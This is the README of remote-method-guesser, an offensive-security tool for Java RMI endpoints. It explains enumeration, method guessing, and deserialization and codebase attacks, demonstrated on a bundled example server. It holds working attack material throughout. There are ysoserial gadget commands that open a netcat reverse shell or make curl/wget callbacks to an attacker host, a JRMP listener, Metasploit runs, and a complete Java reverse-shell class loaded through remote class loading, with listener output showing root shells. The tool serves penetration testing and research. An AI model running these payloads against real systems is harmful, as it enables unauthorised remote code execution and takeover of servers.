### Remote Method Guesser

---

*remote-method-guesser* (*rmg*) is a command line utility written in *Java* and can be used to identify security
vulnerabilities on *Java RMI* endpoints. Currently, the following operations are supported:

* List available *bound names* and their corresponding interface class names
* List codebase locations (if exposed by the remote server)
* Check for known vulnerabilities (enabled class loader, missing *JEP290*, localhost bypass)
* Identify existing remote methods by using a *bruteforce* (wordlist) approach
* Call remote methods with *ysoserial gadgets* within the arguments
* Call remote methods with a client specified codebase (remote class loading attack)
* Perform *DGC* and *registry* calls with *ysoserial* gadgets or a client specified codebase
* Perform *bind*, *unbind* and *rebind* operations against a registry
* Extend ysoserial gadgets with [An Trinhs registry bypass](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
* Create Java code dynamically to invoke remote methods manually

During remote method guessing, deserialization and codebase attacks, the argument types of remote method calls
are confused to prevent method invocation on the server side. This technique is not unique to *remote-method-guesser*
and was used first (to the best of my knowledge) by [Jake Miller](https://twitter.com/theBumbleSec) in the
[rmiscout](https://github.com/BishopFox/rmiscout) project.

![](https://github.com/qtc-de/remote-method-guesser/workflows/master%20maven%20CI/badge.svg?branch=master)
![](https://github.com/qtc-de/remote-method-guesser/workflows/develop%20maven%20CI/badge.svg?branch=develop)
![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20master/badge.svg?branch=master)
![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20develop/badge.svg?branch=develop)
![Remote Method Guesser Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/rmg-example.gif)


### Installation

------

*rmg* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
installed, just execute the following commands to create an executable ``.jar`` file:

```console
$ git clone https://github.com/qtc-de/remote-method-guesser
$ cd remote-method-guesser
$ mvn package
```

*rmg* also supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](./resources/bash_completion.d/rmg) to your ``~/.bash_completion.d`` folder enables
autocompletion.

```console
$ cp resources/bash_completion.d/rmg ~/bash_completion.d/
```


### Supported Operations

-----

In the following, short examples for each available operation are presented. For a more detailed description
you should read the [documentation folder](./docs). All presented examples are based on the [rmg-example-server](https://github.com/qtc-de/remote-method-guesser/packages/414459)
which is also contained within this project. You can also modify and rebuild the example server yourself, by using
the sources within the [docker folder](./.docker).

```console
[qtc@kali ~]$ rmg --help
usage: rmg [options] <ip> <port> <action>
Identify common misconfigurations on Java RMI endpoints.

Positional Arguments:
    ip                              IP address of the target
    port                            Port of the RMI registry
    action                          One of the possible actions listed below

Possible Actions:
    bind <boundname> <listener>     Binds an object to the registry thats points to listener
    codebase <classname> <url>      Perform remote class loading attacks
    dgc <gadget> <command>          Perform DGC based deserialization attacks
    enum                            Enumerate bound names, classes, SecurityManger and JEP290
    guess                           Guess methods on bound names
    listen <gadget> <command>       Open ysoserials JRMP listener
    method <gadget> <command>       Perform method based deserialization attacks
    rebind <boundname> <listener>   Rebinds boundname as object that points to listener
    reg <gadget> <command>          Perform registry based deserialization attacks
    unbind <boundName>              Removes the specified bound name from the registry

Optional Arguments:
    --argument-position <int>       select argument position for deserialization attacks
    --bound-name <name>             guess only on the specified bound name
    --config <file>                 path to a configuration file
    --create-samples                create sample classes for identified methods
    --follow                        follow redirects to different servers
    --force-legacy                  treat all classes as legacy stubs
    --help                          display help message
    --localhost-bypass              attempt localhost bypass for registry operations (CVE-2019-2684)
    --no-color                      disable colored output
    --no-legacy                     disable automatic legacy stub detection
    --reg-method <method>           method to use during registry operations (bind|lookup|unbind|rebind)
    --sample-folder <folder>        folder used for sample generation
    --signature <method>            function signature for guessing or attacking
    --ssl                           use SSL for the rmi-registry connection
    --stack-trace                   display stack traces for caught exceptions
    --template-folder <folder>      location of the template folder
    --threads <int>                 maximum number of threads (default: 5)
    --trusted                       disable bound name filtering
    --update                        update wordlist file with method hashes
    --wordlist-file <file>          wordlist file to use for method guessing
    --wordlist-folder <folder>      location of the wordlist folder
    --yso <file>                    location of ysoserial.jar for deserialization attacks
    --zero-arg                      allow guessing on void functions (dangerous)
```


#### Enumeration (enum)

The ``enum`` action performs several checks on the specified *RMI registry* endpoint. It provides a list of all
available boundnames, displays the servers codebase (if existent), checks for missing *JEP290* and some other
common vulnerabilities. ``enum`` is the default action of *remote-method-guesser* and can either be invoked by
only specifying the port and IP address of a target or by specifying ``enum`` as action explicitly.

```console
[qtc@kali ~]$ rmg 172.18.0.2 9010
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 3 names are bound to the registry.
[+] 
[+] Listing bound names in registry:
[+] 
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 
[+] RMI server codebase enumeration:
[+] 
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+] 
[+] RMI server String unmarshalling enumeration:
[+] 
[+] 	- Server attempted to deserialize object locations during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 
[+] RMI server useCodebaseOnly enumeration:
[+] 
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+] 
[-] 	- Caught NotBoundException during unbind call.
[+] 	  --> RMI registry processed the unbind call and is vulnerable.
[+] 
[+] RMI server DGC enumeration:
[+] 
[+] 	- RMI server does use a SecurityManager for DGC operations.
[+] 	  But access to the class loader is denied.
[+] 	  The DGC uses most likely a separate security policy.
[+] 
[+] RMI server JEP290 enumeration:
[+] 
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
```


#### Method Guessing (guess)

When using the ``guess`` operation, *rmg* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
following form:

```console
[qtc@kali wordlists]$ head -n 5 /opt/remote-method-guesser/wordlists/rmg.txt
boolean call(String dummy, String dummy2, String dummy3)
boolean call(String dummy, String dummy2)
boolean call(String dummy, String[] dummy2)
boolean call(String dummy)
boolean call(String[] dummy)
```

*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
or ``--wordlist-folder`` options. Methods with zero arguments are skipped by default. You can enable them by using the
``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side, as their
invocation cannot be prevented by using invalid argument types.

```console
[qtc@kali ~]$ rmg --ssl --zero-arg 172.18.0.2 1090 guess 
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 3 names are bound to the registry.
[+] 2 wordlist files found.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+] 
[+] Starting RMG Attack
[+] 	No target name specified. Guessing on all available bound names.
[+] 	Guessing 3294 method signature(s).
[+] 	
[+] 	Current bound name: ssl-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String system(String[] dummy) exists!
[+] 			HIT! Method with signature int execute(String dummy) exists!
[+] 			HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		
[+] 	Current bound name: plain-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 			HIT! Method with signature String execute(String dummy) exists!
[+] 		
[+] 	Current bound name: secure-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
[+] 			HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
[+] 			HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		
[+] 
[+] Listing successfully guessed methods:
[+] 	-  ssl-server
[+] 		--> String system(String[] dummy)
[+] 		--> int execute(String dummy)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 	-  plain-server
[+] 		--> String system(String dummy, String[] dummy2)
[+] 		--> String execute(String dummy)
[+] 	-  secure-server
[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
[+] 		--> void logMessage(int dummy1, Object dummy2)
[+] 		--> String login(java.util.HashMap dummy1)
```

To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
contains the pre-computed method hashes and some meta information about the methods.

```console
[qtc@kali wordlists]$ head -n 5 rmg.txt 
boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
boolean call(String dummy, String dummy2); -9048491806834107285; false; false
boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
boolean call(String dummy); -5603201874062960450; false; false
boolean call(String[] dummy); -4301784332653484516; false; false
```

To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
operation. This will update all currently used wordlist files to the optimized format.


#### Method Based Deserialization Attacks (method)

Remote methods that do not only use primitive types within their arguments are often vulnerable to *deserialization attacks*.
This great [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
explains this issue in more detail. *remote-method-guesser* can be used to easily verify such a vulnerability. As an example,
we can use the ``String login(java.util.HashMap dummy1)`` method that was guessed in the example above.

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 attack CommonsCollections6 "nc 172.18.0.1 4444 -e ash" --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[+] Creating ysoserial payload... done.
[+] Attacking String login(java.util.HashMap dummy1)
[+] Target name specified. Only attacking bound name: secure-server
[+] 
[+] Current bound name: secure-server
[+] 	Found non primitive argument type on position 0
[+] 	Invoking remote method...
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Deserialization attack most likely worked :)
```

On another terminal, you can confirm that the *deserialization attack* was indeed successful:

```console
[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:33451.
id
uid=0(root) gid=0(root) groups=0(root)
```

Notice that in the beginning of 2020, the ``unmarshalValue`` method of the ``UnicastRef`` class was changed to handle ``java.lang.String`` in a special way.
Apart from primitive types, also ``java.lang.String`` can now no longer be used for the above mentioned attack on recent *Java* versions. However, other
non primitive types are still vulnerable.


#### General Deserialization Attacks (reg|dgc)

Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote* methods that are needed for the internal *RMI communication*.
In the old days (before *JEP 290*), these internal *remote methods* were vulnerable to exactly the same deserialization attacks as described above. However,
with *JEP 290* deserialization filters were implemented for all internal *RMI communication* and deserialization attacks were (theoretically) no longer possible. 

During it's *enum* action, *remote-method-guesser* already checks whether *JEP290* is installed on the targeted server. For testing purposes you can use the
[example-server](https://github.com/qtc-de/beanshooter/packages/398561) of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running
an unpatched version of *Java*. The following output shows that *remote-method-guesser* successfully identifies the missing *JEP 290* installation:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 1 names are bound to the registry.
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+] 	Redirecting the ssl connection back to 172.18.0.2... 
[+] 	This is done for all further requests. This message is not shown again. 
[+] 
[+] Listing bound names in registry:
[+] 
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
[+] 
[+] RMI server codebase enumeration:
[+] 
[+] 	- The remote server does not expose any codebases.
[+] 
[+] RMI server String unmarshalling enumeration:
[+] 
[+] 	- Server attempted to deserialize object locations during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 
[+] RMI server useCodebaseOnly enumeration:
[+] 
[+] 	- Caught ClassCastException during lookup call.
[+] 	  --> The server ignored the provided codebase (useCodebaseOnly=true).
[+] 
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+] 
[+] 	Caught AccessException during unbindcall.
[+] 	The servers seems to use a SingleEntryRegistry (probably JMX based).
[+] 
[+] RMI server DGC enumeration:
[+] 
[+] 	- RMI server does not use a SecurityManager during DGC operations.
[+] 	  Remote class loading attacks are not possible.
[+] 
[+] RMI server JEP290 enumeration:
[+] 
[+] 	- DGC accepted deserialization of java.util.HashMap (JEP290 is not installed).
```

To confirm that the server is vulnerable you can perform a dedicated *deserialization attack* on the *DGC level* (*DGC* = *Distributed Garbage Collector*,
a *remote object* that is available on almost each *RMI endpoint*). This can be done
by using the ``dgc`` action of *remote-method-guesser*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc CommonsCollections6 "curl 172.18.0.1:8000/vulnerable"
[+] Creating ysoserial payload... done.
[+] Attempting ysoserial attack on DGC endpoint...
[+] 
[+] 	Caught ClassCastException during deserialization attack.
[+] 	Deserialization attack most likely worked :)

[...]

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [27/Dec/2020 06:16:00] code 404, message File not found
172.18.0.2 - - [27/Dec/2020 06:16:00] "GET /vulnerable HTTP/1.1" 404 -
```

The callback from the server shows that the attack was successful. With *JEP290* installed, the server would have rejected the deserialization instead.

Whereas the deserialization filter on the *DGC* is very strict and there are currently no known bypasses, the *RMI registry* itself needs to allow more
classes to be deserialized in order to work correctly. This was abused for some bypasses in the past, where the two most prominent bypasses are the
*JRMPClient* gadget of the [ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java) and
the [RemoteObjectInvocationHandler bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) by [An Trinh](https://twitter.com/_tint0).
Both of them can be used together with *remote-method-guesser's* ``reg`` action and possibly bypass an outdated *JEP290* installation.

Notice that both bypass gadgets cannot be used to execute code directly. Instead they create an outbound *RMI* connection, which is no longer protected
by the deserialization filters. This outbound channel can now be used for deserialization attacks. The most common way to do this is probably using
[ysoserials JRMPListener](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java) and since it is so common,
*remote-method-guesser* has bultin a shortcut (``listen``) to launch this listener.

```console
[qtc@kali ~]$ rmg 172.18.0.2 9010 reg JRMPClient 172.18.0.1:4444
[+] Creating ysoserial payload... done.
[+] 
[+] Attempting deserialization attack on RMI registry endpoint...
[+] 
[+] 	Caught ClassCastException during deserialization attack.
[+] 	The server uses either readString() to unmarshal String parameters, or
[+] 	Deserialization attack was probably successful :)


[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "wget 172.17.0.1:8000/vulnerable"
[+] Creating a JRMPListener on port 4444.
[+] Handing off to ysoserial...
* Opening JRMP listener on 4444
Have connection from /172.18.0.2:40704
Reading message...
Is DGC call for [[0:0:0, -1407888899]]
Sending return with payload for obj [0:0:0, 2]
Closing connection


[qtc@kali www]$ web
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [08/Jan/2021 08:43:14] "GET /vulnerable HTTP/1.1" 200 -
```


#### Method Based Codebase Attacks (codebase)

In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within the *RMI* implementation.
Today, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false`` and uses a *SecurityManager* with a
lax configured security policy. Using the ``auxiliary/scanner/misc/java_rmi_server`` *Metasploit module*, one can easily identify that the *rmg-example-server*
allows *remote class loading*:

```console
msf5 auxiliary(scanner/misc/java_rmi_server) > run
[+] 172.18.0.2:9010       - 172.18.0.2:9010 Java RMI Endpoint Detected: Class Loader Enabled
[*] 172.18.0.2:9010       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

However, verifying the vulnerability isn't straight forward anymore. The following listing shows the output of the ``exploit/multi/misc/java_rmi_server``
*Metasploit module*, which has an *excellent* reliability rank on exploiting this issue:

```console
msf5 exploit(multi/misc/java_rmi_server) > run
[*] Started reverse TCP handler on 172.18.0.1:4444 
[*] 172.18.0.2:9010 - Using URL: http://172.18.0.1:8080/lkIcW0gGgS
[*] 172.18.0.2:9010 - Server started.
[*] 172.18.0.2:9010 - Sending RMI Header...
[*] 172.18.0.2:9010 - Sending RMI Call...
[-] 172.18.0.2:9010 - Exploit failed: RuntimeError Exploit aborted due to failure unknown The RMI class loader couldn't find the payload
[*] 172.18.0.2:9010 - Server stopped.
[*] Exploit completed, but no session was created.
```

The underlying reason is, that the *Metasploit module* (and most other tools as well) attempt to attack the internal *RMI communication*, which is better
protected than *RMI communication* on the application level. In total, there are three reasons why the *Metasploit module* is not working:

1. The *Distributed Garbage Collector* (*DGC*), that is used for the attack above, sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
   ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.

2. *RMI calls* to the *Distributed Garbage Collector* are handled within a separate ``AccessControlContext``, which denies all outbound connections. This
   ``AccessControlContext`` (defined in ``DGCImpl.java``) overwrites the current security policy and ignores user defined policy rules.

3. Even without the two restrictions mentioned above, the *Metasploit module* would still fail. *Remote class loading* attacks send an object of a custom class
   (unknown to the remote server) within *RMI calls*. During a successful attack, the server fetches the class definition from the attacker and calls
   the *readObject* method that contains malicious *Java code*. However, as *internal RMI communication* is now protected by *deserialization filters*, unknown
   classes are rejected while reading the ``ObjectInputStream``.

Whereas the *internal RMI communication* is well protected, *RMI communication* on the application level is not. *remote-method-guesser* can be used to verify
*remote class loading* on a vulnerable endpoint, but as for the *deserialization attack*, it requires a method signature exposed by one of the available bound
names.

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 codebase Example http://172.18.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[+] Attacking String login(java.util.HashMap dummy1)
[+] Target name specified. Only attacking bound name: secure-server
[+]
[+] Current bound name: secure-server
[+] 	Found non primitive argument type on position 0
[+] 	RMI object tries to connect to different remote host: iinsecure.dev
[+] 		Redirecting the connection back to 172.18.0.2... 
[+] 		This is done for all further requests. This message is not shown again. 
[+] 	Invoking remote method...
```

When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:

```console
[qtc@kali www]$ web
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [14/Nov/2020 07:48:59] "GET /Example.class HTTP/1.1" 200 -
```

*remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
within the ``readObject`` method of the class. For this demonstration, the following class definition was used, that spawns a reverse shell:

```java
// Taken from: https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.jar.Attributes;
import java.io.Serializable;
import java.io.ObjectInputStream;

public class Example implements Serializable
{
    private static int port = 4444;
    private static String cmd = "/bin/ash";
    private static String host = "172.18.0.1";
    private static final long serialVersionUID = 2L;

    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
    {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {

            while(pi.available()>0)
                so.write(pi.read());

            while(pe.available()>0)
                so.write(pe.read());

            while(si.available()>0)
                po.write(si.read());

            so.flush();
            po.flush();
            Thread.sleep(50);

            try {
                p.exitValue();
                break;
            } catch (Exception e){}
        }

        p.destroy();
        s.close();
    }
}
```

After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:

```console
[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:37874.
id
uid=0(root) gid=0(root) groups=0(root)
```


#### General Codebase Attacks (codebase)

As previously mentioned, the internal *DGC communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
endpoins, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 codebase Example 172.18.0.1:8000 --signature reg
[+] 
[+] Attempting codebase attack on RMI registry endpoint...
[+] Using class Example with codebase http://172.18.0.1:8000/ during lookup call.

[qtc@kali www]$ web
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [08/Jan/2021 06:55:59] "GET /Example.class HTTP/1.1" 200 -

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:40748.
id
uid=0(root) gid=0(root) groups=0(root)
```

However, notice that the payload class needs to extend the ``java.rmi.server.RemoteObjec`` class in order to be accepted by the
deserialization filters. Codebase attacks on the *DGC* can also be launched theoretically by using the ``--signature dgc`` option.
However, this has not been tested so far.


#### Sample Generation (--create-samples)

Despite being none of the available actions, *sample generation* is another useful feature of *remote-method-guesser* and can be enabled
during the ``guess`` action. In some situations, *RMI* endpoints expose methods that sound interesting on their own, without thinking
about *deserialization* or *codebase attacks*. Consider the example above, where the ``plain-server`` bound name exposes such promising
methods:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess
[...]
[+] Listing successfully guessed methods:
[+] 	-  plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[...]
```

Depending on the situation, it might be desired to invoke these methods using legitimate *RMI calls*, but writing the corresponding *Java code*
manually is a tedious work. By using the ``--create-samples`` parameter of *remote-method-guesser*, you can create sample code for successfully
guessed *remote methods* automatically. By using the ``--signature`` and ``--bound-name`` options, it is also possible to generate code only
for one already known method. The following command generates the required *Java code* to invoke the ``execute`` method on the ``plain-server``
bound name:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[+] 
[+] Starting RMG Attack
[+] 	Target name specified. Only guessing on bound name: plain-server
[+] 	Guessing 1 method signature(s).
[+] 	Method signature: String execute(String dummy)
[+] 	
[+] 	Skipping bound name ssl-server
[+] 	Current bound name plain-server
[+] 		RMI object tries to connect to different remote host: iinsecure.dev
[+] 			Redirecting the connection back to 172.18.0.2... 
[+] 			This is done for all further requests. This message is not shown again. 
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String execute(String dummy) exists!
[+] 		
[+] 	Skipping bound name secure-server
[+] 
[+] Listing successfully guessed methods:
[+] 	•  plain-server
[+] 		--> String execute(String dummy)
[+] 
[+] Starting creation of sample files:
[+] 
[+] 	Creating samples for bound name plain-server
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
```

As the output above suggests, *remote-method-guesser* created two files for the *remote method*:

1. ``IPlainServer.java``: Contains the interface code that is required for the *RMI call*.
2. ``execute.java``: Contains the *Java code* that is used for the actual method invocation.

As *remote-method-guesser* cannot know which arguments you want to use for the method call, these are left as ``TODOs`` within the
generated code:

```java
[qtc@kali ~]$ grep -A 5 "TODO" /home/qtc/rmg-samples/plain-server/execute/execute.java
            java.lang.String argument0 = TODO;

            System.out.print("[+] Invoking method execute... ");
            java.lang.String response = stub.execute(argument0);
            System.out.println("done!");
```

For this demonstration, ``TODO`` is replaced by the String ``id``, as the method name ``execute`` could mean that the argument is used for
command execution. After making this substitution and compiling the two generated files, the *remote method* can be invoked:

```console
[qtc@kali ~]$ cd /home/qtc/rmg-samples/plain-server/
[qtc@kali plain-server]$ javac IPlainServer.java -d .
[qtc@kali plain-server]$ sed -i -e 's/TODO/"id"/' execute/execute.java 
[qtc@kali plain-server]$ javac execute/execute.java -d .
[qtc@kali plain-server]$ java execute
[+] Connecting to registry on 172.18.0.2:1090... done!
[+] Starting lookup on plain-server... 
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.18.0.2... 
[+]	This is done for all further requests. This message is not shown again. 
[+] Invoking method execute... done!
[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
```

Other benefits of samples generated by *rmg* are some nice *rmg* features that are already build inside. This includes full *TLS* support, for remote objects
and the *RMI registry*, as well as automatic target redirection.


### Wordlists Files

-----

*remote-method-guesser* guesses *remote methods* based on a wordlist approach. Corresponding wordlists are shipped within this repository and are contained
within the [wordlist directory](./wordlists). Wordlists are stored using an optimized  *rmg-internal* format:

```
<RETURN_VALUE> <METHODNAME>(<ARGUMENTS>); <METHOD_HASH>; <IS_PRIMITIVE>; <IS_VOID>;
```

The first three placeholders should be self explanatory and match the format of a common *Java method signature*. The last three placeholders
describe the following properties of a function:

1. ``<METHOD_HASH>``: The method hash that is used by *RMI* internally to identify the remote method.
2. ``<IS_PRIMITIVE>``: Describes whether the first function parameter is a primitive type or not.
3. ``<IS_VOID>``: Describes whether the function takes parameters or not (yes, the name is a little bit misleading).

All this information is used to speed up *RMI calls* and to reduce the amount of *dynamic class generation*. The resulting wordlist files
look like this:

```console
[qtc@kali wordlists]$ head -n 5 rmg.txt 
boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
boolean call(String dummy, String dummy2); -9048491806834107285; false; false
boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
boolean call(String dummy); -5603201874062960450; false; false
boolean call(String[] dummy); -4301784332653484516; false; false
```

However, *remote-method-guesser* is also able to process non-optimized wordlists that contain plain function signatures:

```console
[qtc@kali wordlists]$ cat custom_wordlist.txt
boolean example_signature(String test)
[qtc@kali wordlists]$ rmg --ssl 172.18.0.2 1090 guess
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 3 names are bound to the registry.
[+] 3 wordlist files found.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/custom_wordlist.txt
[+] 	1 methods were successfully parsed.
[...]
```

Furthermore, by using the ``--update`` switch during the ``guess`` action, *remote-method-guesser* updates your wordlist to the optimized format:

```console
[qtc@kali wordlists]$ cat custom_wordlist.txt
boolean example_signature(String test); -8079561808652318592; false; false
```

*remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
you can change the default location within the configuration file. For dynamic changes you can also use the ``--wordlist-file`` and
``--wordlist-folder`` options.


### Template Files

----

Template files are used by *remote-method-guesser* for sample generation. They are located in the [templates folder](./templates) and
contain all the *Java code* required for sample generation (apart from some placeholders). During the sample generation process,
*rmg* simply replaces the placeholders with appropriate values for the current *remote method*.

It is generally not recommended to modify the template files, but it is of cause possible if you know what you are doing. However,
keep in mind that template files should stay generic and that the different placeholders are usually required to guarantee this.

As automatically generated sample files contain content that is controlled by the remote server (*bound names*, *class names* and *package names*),
it is generally a security risk to compile and execute them. *remote-method-guesser* tries to reduce the risk by applying input filtering to
the above mentioned components. In some situations, this can be annoying. Especially *bound names* can contain a wide range of different characters
and most of them are rejected by *rmg* (this is because a whitelist filtering is used, instead of a blacklist). After you reviewed the *bound names*
and corresponding *remote classes* by using *rmgs* ``enum`` action, you may use the ``--trusted`` switch to disable input filtering during
sample generation. However, this should only be done after verifying that the remote server does not expose any malicious contents within its
*bound names* or *remote class names*.


### Configuration

-----

*remote-method-guesser* provides some command line switches to modify its behavior dynamically, but persistent configuration changes
are also quite easy to implement. *rmg* uses a [configuration file](./src/config.properties) to obtain default values for certain options,
but it also accepts a different configuration file passed using the ``--config`` option. The current default configuration looks like this:

```properties
template-folder  = /opt/remote-method-guesser/templates/
wordlist-folder  = /opt/remote-method-guesser/wordlists/
sample-folder    = ./rmg-samples
wordlist-file    =
ysoserial-path   = /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
threads = 5
```

For persistent configuration changes, just apply them to the ``./src/config.properties`` file and rebuild *rmg* as explained above.
You can also create a ``.properties`` file with your own configuration and feed it into *rmg* using the ``--config`` option.


### Acknowledgements

----

Version ``v3.0.0`` of *remote-method-guesser* was heavily influenced by the great blog posts of [Hans-Martin Münch](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
